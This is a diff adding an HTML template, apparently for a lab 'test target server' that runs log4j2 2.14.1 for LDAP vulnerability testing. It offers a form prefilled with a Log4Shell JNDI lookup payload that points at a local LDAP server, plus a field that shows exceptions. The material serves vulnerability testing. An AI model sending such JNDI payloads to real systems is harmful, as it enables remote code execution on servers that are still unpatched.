@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+  <head>
+    <title>테스트 타겟 서버</title>
+    <style>
+      input {width: 300px;}
+    </style>
+  </head>
+  <body>
+    <p>안녕하세요. log4j2 2.14.1를 사용해서 LDAP 취약점 테스트를 진행하는 서버입니다.</p>
+    <p>서버시간: <span th:text='${serverTime}'></span></p>
+    <form action="form" th:action="@{/form}" method="post">
+      <label>LDAP STRING</label>
+      <input type="text" name="ldapString" value="${jndi:ldap://127.0.0.1:19090/run}"/>
+      <button>전송</button>
+    </form>
+    <textarea th:text='${exception}' cols="55" rows="10"></textarea>
+  </body>
+</html>
